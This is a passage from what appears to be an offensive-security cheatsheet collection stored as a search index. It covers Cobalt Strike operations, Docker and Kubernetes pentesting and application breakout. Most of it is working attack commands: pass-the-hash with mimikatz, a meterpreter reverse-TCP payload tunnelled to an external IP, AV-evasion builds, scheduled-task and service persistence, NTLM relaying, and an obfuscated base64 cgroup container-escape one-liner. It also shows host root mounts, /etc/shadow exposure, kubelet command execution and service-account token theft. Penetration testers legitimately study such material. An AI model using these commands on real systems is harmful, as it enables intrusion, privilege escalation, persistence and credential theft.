\"jump\" to another target on the network.</li> <li>remote-exec: Execute a command on a remote target using psexec, winrm or wmi. \\  The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target.</li> <li>ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts.</li> </ul> <p> All the commands launch powershell.exe</p> <pre><code>Beacon Remote Exploits\n======================\njump [module] [target] [listener] \npsexec  x86 Use a service to run a Service EXE artifact\npsexec64    x64 Use a service to run a Service EXE artifact\npsexec_psh  x86 Use a service to run a PowerShell one-liner\nwinrm   x86 Run a PowerShell script via WinRM\nwinrm64 x64 Run a PowerShell script via WinRM\nBeacon Remote Execute Methods\n=============================\nremote-exec [module] [target] [command] \nMethods                         Description\n-------                         -----------\npsexec                          Remote execute via Service Control Manager\nwinrm                           Remote execute via WinRM (PowerShell)\nwmi                             Remote execute via WMI (PowerShell)\n</code></pre> <p>Opsec safe Pass-the-Hash: 1. <code>mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\"powershell -w hidden\"</code> 2. <code>steal_token PID</code></p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#assume-control-of-artifact","title":"Assume Control of Artifact","text":"<ul> <li>Use <code>link</code> to connect to SMB Beacon</li> <li>Use <code>connect</code> to connect to TCP Beacon</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#vpn-pivots","title":"VPN &amp; Pivots","text":"<p> Covert VPN doesn't work with W10, and requires Administrator access to deploy.</p> <p>Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.</p> <pre><code># Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.\nbeacon &gt; socks [PORT]\nbeacon &gt; socks [port]\nbeacon &gt; socks [port] [socks4]\nbeacon &gt; socks [port] [socks5]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]\nbeacon &gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]\n# Proxy browser traffic through a specified Internet Explorer process.\nbeacon &gt; browserpivot [pid] [x86|x64]\n# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.\nbeacon &gt; rportfwd [bind port] [forward host] [forward port]\n# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin\nbeacon&gt; spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin\n# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller\n# then you can handle the connect back on your MSF multi handler\nbeacon&gt; spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#kits","title":"Kits","text":"<ul> <li>Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#elevate-kit","title":"Elevate Kit","text":"<p>UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)</p> <pre><code>beacon&gt; runasadmin\nBeacon Command Elevators\n========================\nExploit                         Description\n-------                         -----------\nms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)\nms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)\nms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)\nsvc-exe                         Get SYSTEM via an executable run as a service\nuac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)\nuac-token-duplication           Bypass UAC with Token Duplication\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#persistence-kit","title":"Persistence Kit","text":"<ul> <li>https://github.com/0xthirteen/MoveKit</li> <li>https://github.com/fireeye/SharPersist     <pre><code># List persistences\nSharPersist -t schtaskbackdoor -m list\nSharPersist -t startupfolder -m list\nSharPersist -t schtask -m list\n# Add a persistence\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\nSharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\nSharPersist -t service -n \"Some Service\" -m remove\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\nSharPersist -t schtask -n \"Some Task\" -m remove\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#resource-kit","title":"Resource Kit","text":"<p>The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows</p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#artifact-kit","title":"Artifact Kit","text":"<p>Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique's folder.</p> <p>Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :</p> <ul> <li>Download the artifact kit : <code>Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)</code></li> <li>Install the dependencies : <code>sudo apt-get install mingw-w64</code></li> <li>Edit the Artifact code<ul> <li>Change pipename strings</li> <li>Change <code>VirtualAlloc</code> in <code>patch.c</code>/<code>patch.exe</code>, e.g: HeapAlloc</li> <li>Change Import</li> </ul> </li> <li>Build the Artifact</li> <li>Cobalt Strike -&gt; Script Manager &gt; Load .cna</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#mimikatz-kit","title":"Mimikatz Kit","text":"<ul> <li>Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)</li> <li>Load the mimikatz.cna aggressor script</li> <li>Use mimikatz functions as normal</li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#sleep-mask-kit","title":"Sleep Mask Kit","text":"<p>The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.</p> <p>Use the included <code>build.sh</code> or <code>build.bat</code> script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.</p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#thread-stack-spoofer","title":"Thread Stack Spoofer","text":"<p>An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.</p> <p>Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option <code>artifactkit_stack_spoof</code> in the config file <code>arsenal_kit.config</code>.</p>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#beacon-object-files","title":"Beacon Object Files","text":"<p>A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs</p> <p>Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h</p> <ul> <li>Compile     <pre><code># To compile this with Visual Studio:\ncl.exe /c /GS- hello.c /Fohello.o\n# To compile this with x86 MinGW:\ni686-w64-mingw32-gcc -c hello.c -o hello.o\n# To compile this with x64 MinGW:\nx86_64-w64-mingw32-gcc -c hello.c -o hello.o\n</code></pre></li> <li>Execute: <code>inline-execute /path/to/hello.o</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#ntlm-relaying-via-cobalt-strike","title":"NTLM Relaying via Cobalt Strike","text":"<pre><code>beacon&gt; socks 1080\nkali&gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://&lt;IP_TARGET&gt;\nbeacon&gt; rportfwd_local 8445 &lt;IP_KALI&gt; 445\nbeacon&gt; upload C:\\Tools\\PortBender\\WinDivert64.sys\nbeacon&gt; PortBender redirect 445 8445\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#references","title":"References","text":"<ul> <li>Red Team Ops with Cobalt Strike (1 of 9): Operations</li> <li>Red Team Ops with Cobalt Strike (2 of 9): Infrastructure</li> <li>Red Team Ops with Cobalt Strike (3 of 9): C2</li> <li>Red Team Ops with Cobalt Strike (4 of 9): Weaponization</li> <li>Red Team Ops with Cobalt Strike (5 of 9): Initial Access</li> <li>Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation</li> <li>Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation</li> <li>Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement</li> <li>Red Team Ops with Cobalt Strike (9 of 9): Pivoting</li> <li>A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 </li> <li>Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019</li> <li>TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE \u2013 UB 2018 - NOV 25 2018</li> <li>Cobalt Strike - DNS Beacon</li> <li>How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017</li> <li>NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse</li> <li>Cobalt Strike - User Guide</li> <li>Cobalt Strike 4.6 - User Guide PDF</li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/","title":"Container - Docker Pentest","text":"<p>Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.</p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Mounted Docker Socket</li> <li>Open Docker API Port</li> <li>Insecure Docker Registry</li> <li>Exploit privileged container abusing the Linux cgroup v1<ul> <li>Abusing CAP_SYS_ADMIN capability</li> <li>Abusing coredumps and core_pattern</li> </ul> </li> <li>Breaking out of Docker via runC</li> <li>Breaking out of containers using a device file</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#tools","title":"Tools","text":"<ul> <li>Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations     <pre><code>dockscan unix:///var/run/docker.sock\ndockscan -r html -o myreport -v tcp://example.com:5422\n</code></pre></li> <li>DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)     <pre><code>./deepce.sh \n./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce\n./deepce.sh --no-enumeration --exploit SOCK --shadow\n./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami&gt;/tmp/hacked\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#mounted-docker-socket","title":"Mounted Docker Socket","text":"<p>Prerequisite: * Socker mounted as volume : <code>- \"/var/run/docker.sock:/var/run/docker.sock\"</code></p> <p>Usually found in <code>/var/run/docker.sock</code>, for example for Portainer.</p> <pre><code>curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json\ncurl -XPOST \u2013unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create\ncurl -XPOST \u2013unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start\n</code></pre> <p>Exploit using brompwnie/ed</p> <pre><code>root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        \n[+] Hunt dem Socks\n[+] Hunting Down UNIX Domain Sockets from: /var/run/\n[*] Valid Socket: /var/run/docker.sock\n[+] Attempting to autopwn\n[+] Hunting Docker Socks\n[+] Attempting to Autopwn:  /var/run/docker.sock\n[*] Getting Docker client...\n[*] Successfully got Docker client...\n[+] Attempting to escape to host...\n[+] Attempting in TTY Mode\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\nchroot /host &amp;&amp; clear\necho 'You are now on the underlying host'\n/ # chroot /host &amp;&amp; clear\n/ # echo 'You are now on the underlying host'\nYou are now on the underlying host\n/ # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#open-docker-api-port","title":"Open Docker API Port","text":"<p>Prerequisite: * Docker runned with <code>-H tcp://0.0.0.0:XXXX</code></p> <pre><code>$ nmap -sCV 10.10.10.10 -p 2376\n2376/tcp open  docker  Docker 19.03.5\n| docker-version:\n|   Version: 19.03.5\n|   MinAPIVersion: 1.12\n</code></pre> <p>Mount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem in <code>/mnt</code>.</p> <pre><code>$ export DOCKER_HOST=tcp://10.10.10.10:2376\n$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash\nor\n$ docker -H  open.docker.socket:2375 ps\n$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash\nor \n$ curl -s \u2013insecure https://tls-opendocker.socket:2376/secrets | jq\n$ curl \u2013insecure -X POST -H \"Content-Type: application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}'\n</code></pre> <p>From there you can backdoor the filesystem by adding an ssh key in <code>/root/.ssh</code> or adding a new root user in <code>/etc/passwd</code>.</p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#insecure-docker-registry","title":"Insecure Docker Registry","text":"<p>Docker Registry\u2019s fingerprint is <code>Docker-Distribution-Api-Version</code> header. Then connect to Registry API endpoint: <code>/v2/_catalog</code>.</p> <pre><code>curl https://registry.example.com/v2/&lt;image_name&gt;/tags/list\ndocker pull https://registry.example.com:443/&lt;image_name&gt;:&lt;tag&gt;\n# connect to the endpoint and list image blobs\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list\ncurl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest\n# download blobs\ncurl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' &gt; out.tar.gz\n# automated download\nhttps://github.com/NotSoSecure/docker_fetch/\npython /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local\n</code></pre> <p>Access a private registry and start a container with one of its image</p> <pre><code>docker login -u admin -p admin docker.registry.local\ndocker pull docker.registry.local/wordpress-image\ndocker run -it docker.registry.local/wordpress-image /bin/bash\n</code></pre> <p>Access a private registry using OAuth Token from Google</p> <pre><code>curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email\ncurl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \ndocker login -e &lt;email&gt; -u oauth2accesstoken -p \"&lt;access token&gt;\" https://gcr.io\n</code></pre>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#exploit-privileged-container-abusing-the-linux-cgroup-v1","title":"Exploit privileged container abusing the Linux cgroup v1","text":"<p>Prerequisite (at least one):   * <code>--privileged</code>  * <code>--security-opt apparmor=unconfined --cap-add=SYS_ADMIN</code> flags.</p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#abusing-cap_sys_admin-capability","title":"Abusing CAP_SYS_ADMIN capability","text":"<pre><code>docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo \"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\" | base64 -d | bash -'\n</code></pre> <p>Exploit breakdown :</p> <pre><code># On the host\ndocker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash\n# In the container\nmkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x\necho 1 &gt; /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent\necho '#!/bin/sh' &gt; /cmd\necho \"ps aux &gt; $host_path/output\" &gt;&gt; /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#abusing-coredumps-and-core_pattern","title":"Abusing coredumps and core_pattern","text":"<ol> <li>Find the mounting point using <code>mount</code> <pre><code>$ mount | head -n 1\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)\n</code></pre></li> <li>Create an evil binary at the root of the filesystem: <code>cp /tmp/poc /poc</code></li> <li>Set the program to be executed on the coredumps     <pre><code>echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\" &gt; /proc/sys/kernel/core_pattern\n</code></pre></li> <li>Generate a coredump with a faulty program: <code>gcc -o crash crash.c &amp;&amp; ./crash</code> <pre><code>int main(void) {\nchar buf[1];\nfor (int i = 0; i &lt; 100; i++) {\nbuf[i] = 1;\n}\nreturn 0;\n}\n</code></pre></li> <li>Your payload should have been executed on the host</li> </ol>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-docker-via-runc","title":"Breaking out of Docker via runC","text":"<p>The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability overview by the runC team</p> <p>Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736</p> <pre><code>$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC\n$ docker run --rm cve-2019-5736:malicious_image_POC\n</code></pre>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-containers-using-a-device-file","title":"Breaking out of containers using a device file","text":"<pre><code>https://github.com/FSecureLABS/fdpasser\nIn container, as root: ./fdpasser recv /moo /etc/shadow\nOutside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \"sleep 1337\")/root/moo\nOutside container: ls -la /etc/shadow\nOutput: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow\n</code></pre>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-docker-via-kernel-modules-loading","title":"Breaking out of Docker via kernel modules loading","text":"<p>When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape.</p> <p>Exploitation: * Clone the repository : <code>git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping</code> * Build with <code>make</code> * Start a privileged docker container with <code>docker run -it --privileged --hostname docker --mount \"type=bind,src=$PWD,dst=/root\" ubuntu</code> * <code>cd /root</code> in the new container * Insert the kernel module with <code>./escape</code> * Run <code>./execute</code>!</p> <p>Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; <code>/proc/escape</code> and <code>/proc/output</code>.</p> <ul> <li><code>/proc/escape</code> only answers to write requests and simply executes anything that's passed to it via <code>call_usermodehelper()</code>.</li> <li><code>/proc/output</code> just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to.</li> </ul> <p>The clever part is that anything we write to <code>/proc/escape</code> gets sandwiched into <code>/bin/sh -c &lt;INPUT&gt; &gt; /proc/output</code>. This means that the command is run under <code>/bin/sh</code> and the output is redirected to <code>/proc/output</code>, which we can then read from within the container.</p> <p>Once the module is loaded, you can simply <code>echo \"cat /etc/passwd\" &gt; /proc/escape</code> and then get the result via <code>cat /proc/output</code>. Alternatively, you can use the <code>execute</code> program to give yourself a makeshift shell (albeit an extraordinarily basic one).</p> <p>The only caveat is that we cannot be sure that the container has <code>kmod</code> installed (which provides <code>insmod</code> and <code>rmmod</code>). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the <code>init_module()</code> syscall to load the module into the kernel without needing <code>insmod</code>. If you're interested, take a look at the Makefile.</p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#references","title":"References","text":"<ul> <li>Hacking Docker Remotely - 17 March 2020 - ch0ks</li> <li>Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits</li> <li>Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon</li> <li>Breaking out of Docker via runC \u2013 Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019</li> <li>CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl</li> <li>OWASP - Docker Security CheatSheet</li> <li>Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017</li> <li>Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator</li> <li>Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer</li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/","title":"Container - Kubernetes Pentest","text":"<p>Kubernetes commonly stylized as K8s) is an open-source container orchestration system for automating software deployment, scaling, and management.</p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Accessible kubelet on 10250/TCP</li> <li>Obtaining Service Account Token</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/#tools","title":"Tools","text":"<ul> <li>BishopFox/badpods - A collection of manifests that will create pods with elevated privileges.     <pre><code>kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml\nkubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml\n</code></pre></li> <li>serain/kubelet-anon-rce</li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/#accessible-kubelet-on-10250tcp","title":"Accessible kubelet on 10250/TCP","text":"<p>Requirements: * <code>--anonymous-auth</code>: Enables anonymous requests to the Kubelet server</p> <ul> <li>Getting pods: <code>curl -ks https://worker:10250/pods</code></li> <li>Run commands: <code>curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/#obtaining-service-account-token","title":"Obtaining Service Account Token","text":"<p>Token is stored at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></p> <p>Use the service account token: * on kube-apiserver API: <code>curl -ks -H \"Authorization: Bearer &lt;TOKEN&gt;\" https://master:6443/api/v1/namespaces/{namespace}/secrets</code> * with kubectl: <code>kubectl --insecure-skip-tls-verify=true --server=\"https://master:6443\" --token=\"&lt;TOKEN&gt;\" get secrets --all-namespaces -o json</code></p>"},{"location":"Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/#references","title":"References","text":"<ul> <li>Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/","title":"Application Escape and Breakout","text":""},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#summary","title":"Summary","text":"<ul> <li>Gaining a command shell</li> <li>Sticky Keys</li> <li>Dialog Boxes<ul> <li>Creating new files</li> <li>Open a new Windows Explorer instance</li> <li>Exploring Context Menus</li> <li>Save as</li> <li>Input Boxes</li> <li>Bypass file restrictions</li> </ul> </li> <li>Internet Explorer</li> <li>Shell URI Handlers</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#gaining-a-command-shell","title":"Gaining a command shell","text":"<ul> <li>Shortcut<ul> <li>[Window] + [R] -&gt; cmd </li> <li>[CTRL] + [SHIFT] + [ESC] -&gt; Task Manager</li> <li>[CTRL] + [ALT] + [DELETE] -&gt; Task Manager </li> </ul> </li> <li>Access through file browser: Browsing to the folder containing the binary (i.e. <code>C:\\windows\\system32\\</code>), we can simply right click and <code>open</code> it</li> <li>Drag-and-drop: dragging and dropping any file onto the cmd.exe </li> <li>Hyperlink: <code>file:///c:/Windows/System32/cmd.exe</code></li> <li>Task Manager: <code>File</code> &gt; <code>New Task (Run...)</code> &gt; <code>cmd</code></li> <li>MSPAINT.exe<ul> <li>Open MSPaint.exe and set the canvas size to: <code>Width=6</code> and <code>Height=1</code> pixels</li> <li>Zoom in to make the following tasks easier</li> <li>Using the colour picker, set pixels values to (from left to right):     <pre><code>1st: R: 10,  G: 0,   B: 0\n2nd: R: 13,  G: 10,  B: 13\n3rd: R: 100, G: 109, B: 99\n4th: R: 120, G: 101, B: 46\n5th: R: 0,   G: 0,   B: 101\n6th: R: 0,   G: 0,   B: 0\n</code></pre></li> <li>Save it as 24-bit Bitmap (.bmp;.dib)</li> <li>Change its extension from bmp to bat and run </li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#sticky-keys","title":"Sticky Keys","text":"<ul> <li>Spawn the sticky keys dialog<ul> <li>Via Shell URI : <code>shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code></li> <li>Hit 5 times [SHIFT]</li> </ul> </li> <li>Visit \"Ease of Access 